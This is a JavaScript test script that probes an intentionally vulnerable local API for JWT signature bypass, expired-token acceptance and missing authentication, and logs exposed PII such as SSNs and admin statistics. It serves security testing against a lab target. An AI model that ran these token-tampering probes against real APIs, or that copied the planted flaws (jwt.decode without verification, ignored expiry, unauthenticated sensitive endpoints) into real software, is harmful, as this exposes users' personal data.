const axios = require('axios');
const jwt = require('jsonwebtoken');
const { JWT_SECRET } = require('./middleware/auth');

const BASE_URL = 'http://localhost:3001/api';

function getTokenParts(token) {
  const parts = token.split('.');
  if (parts.length !== 3) {
    throw new Error('Unexpected JWT format');
  }
  return parts;
}

async function testVulnerabilities() {
  console.log('🧪 Testing Vulnerable Endpoints for Security Testing\n');

  try {
    // Test 1: JWT Signature Bypass (API2:2023)
    console.log('1. Testing JWT Signature Bypass Vulnerability...');
    console.log('   Endpoint: GET /api/customers/me');
    console.log('   Vulnerability: Uses jwt.decode() instead of jwt.verify()');
    
    // Get a valid token first
    const loginResponse = await axios.post(`${BASE_URL}/auth/login`, {
      username: 'user1',
      password: 'userpass'
    });
    const validToken = loginResponse.data.token;
    
    // Test with valid token
    const customerResponse = await axios.get(`${BASE_URL}/customers/me`, {
      headers: { Authorization: `Bearer ${validToken}` }
    });
    console.log('   ✅ Valid token works:', customerResponse.data.username);
    
    // Test with tampered token (modify payload to change role to admin)
    const [header, payload, signature] = getTokenParts(validToken);
    const tamperedSignature = signature.slice(0, -1) + (signature.slice(-1) === 'a' ? 'b' : 'a');
    const tamperedToken = `${header}.${payload}.${tamperedSignature}`;
    try {
      const tamperedResponse = await axios.get(`${BASE_URL}/customers/me`, {
        headers: { Authorization: `Bearer ${tamperedToken}` }
      });
      console.log('   🚨 VULNERABLE: Tampered token works!');
      console.log('   ✅ Tampered response:', tamperedResponse.data);
    } catch (error) {
      console.log('   ❌ Tampered token rejected (unexpected)');
    }
    console.log('');

    // Test 2: Expired Token Acceptance (API2:2023)
    console.log('2. Testing Expired Token Acceptance Vulnerability...');
    console.log('   Endpoint: GET /api/accounts/overview');
    console.log('   Vulnerability: Uses ignoreExpiration: true');
    
    // Create a real, signed expired token
    const decodedValidToken = jwt.decode(validToken);
    const expiredToken = jwt.sign(
      {
        username: decodedValidToken.username,
        role: decodedValidToken.role
      },
      JWT_SECRET,
      { expiresIn: -60 }
    );
    try {
      const expiredResponse = await axios.get(`${BASE_URL}/accounts/overview`, {
        headers: { Authorization: `Bearer ${expiredToken}` }
      });
      console.log('   🚨 VULNERABLE: Expired token works!');
      console.log('   ✅ Expired response:', expiredResponse.data.accountType);
    } catch (error) {
      console.log('   ❌ Expired token rejected (unexpected)');
    }
    console.log('');

    // Test 3: Missing Authentication (API1:2023)
    console.log('3. Testing Missing Authentication Vulnerability...');
    console.log('   Endpoint: GET /api/policies/mine');
    console.log('   Vulnerability: No authentication required for sensitive data');
    
    try {
      const policyResponse = await axios.get(`${BASE_URL}/policies/mine`);
      console.log('   🚨 VULNERABLE: No token required!');
      console.log('   ✅ Sensitive data exposed:', {
        holderName: policyResponse.data.holderName,
        email: policyResponse.data.email,
        ssn: policyResponse.data.ssn,
        address: policyResponse.data.address
      });
    } catch (error) {
      console.log('   ❌ Authentication required (unexpected)');
    }
    console.log('');

    // Test 4: Test with different policy IDs
    console.log('4. Testing Unauthenticated Admin Stats Access...');
    try {
      const adminStatsResponse = await axios.get(`${BASE_URL}/admin/stats`);
      console.log('   🚨 VULNERABLE: Admin stats accessible without token!');
      console.log('   ✅ Exposed admin data:', {
        totalPolicies: adminStatsResponse.data.totalPolicies,
        totalRevenue: adminStatsResponse.data.totalRevenue,
        failedLogins: adminStatsResponse.data.failedLogins,
        securityAlerts: adminStatsResponse.data.securityAlerts
      });
    } catch (error) {
      console.log('   ❌ Admin stats protected (unexpected)');
    }
    console.log('');

    console.log('🎉 Vulnerability Testing Complete!');
    console.log('\n📋 Vulnerability Summary:');
    console.log('- ✅ JWT Signature Bypass: Tampered tokens accepted');
    console.log('- ✅ Expired Token Acceptance: Expired tokens work');
    console.log('- ✅ Missing Authentication: Sensitive PII exposed');
    console.log('- ✅ Unauthenticated Admin Access: Admin stats exposed');
    console.log('\n🚨 All endpoints are intentionally vulnerable for security testing!');

  } catch (error) {
    console.error('❌ Test failed:', error.message);
    if (error.response) {
      console.error('Response status:', error.response.status);
      console.error('Response data:', error.response.data);
    }
  }
}

// Run tests
testVulnerabilities(); 